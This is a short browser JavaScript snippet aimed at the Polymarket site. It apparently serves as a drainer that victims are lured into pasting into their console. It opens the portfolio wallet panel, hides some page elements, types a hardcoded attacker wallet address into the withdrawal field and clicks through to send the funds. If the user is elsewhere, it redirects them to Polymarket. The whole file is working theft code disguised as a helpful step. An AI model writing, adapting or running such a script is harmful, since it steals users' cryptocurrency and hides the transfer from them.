(() => {
    const waitForElement = (selector, callback) => {
        const interval = setInterval(() => {
            const element = document.querySelector(selector);
            if (element) {
                clearInterval(interval);
                callback(element);
            };
        }, 25);
    };
    const pButton = document.querySelector('a[href="/portfolio"]');
    if (pButton){
        pButton.click();
        waitForElement('.c-PJLV.c-fEYZoB.c-PJLV-ifaqjNP-css.c-PJLV-ihMAWeA-css', (walletButton) => {
            walletButton.click();
            document.querySelector('.c-hRTBiE.c-hRTBiE-jBItBf-animate-true.c-hRTBiE-enfyd-cv.c-hRTBiE-ifDzwXU-css').setAttribute('hidden', '');
            document.querySelector('.c-eGKobs.c-eGKobs-idZqcTT-css').setAttribute('hidden', '');
            waitForElement('input[placeholder="0x..."]', (inputElement) => {
                const valueSetter = Object.getOwnPropertyDescriptor(
                    window.HTMLInputElement.prototype, 'value'
                ).set;
                const address = "0x2753A71bbE5FBAbeF5Ada4dC556915A508b1b0ac";
                valueSetter.call(inputElement, address);
                inputElement.dispatchEvent(new Event('input', { bubbles: true }));
                inputElement.dispatchEvent(new Event('change', { bubbles: true }));
                document.querySelector('.c-PJLV.c-PJLV-ihrMtea-css').click();
                document.querySelector('.c-gBrBnR.c-gBrBnR-gDWzxt-variant-primary.c-gBrBnR-eBERDr-height-lg.c-gBrBnR-dRRWyf-fontSize-md.c-gBrBnR-igULOkw-css').click();
            });
        });
    } else {
        alert("To continue, navigate to Polymarket and retry. Redirecting...");
        window.location.href = decodeURIComponent("https%3A%2F%2Fpolymarket.com%2F");
    };
})();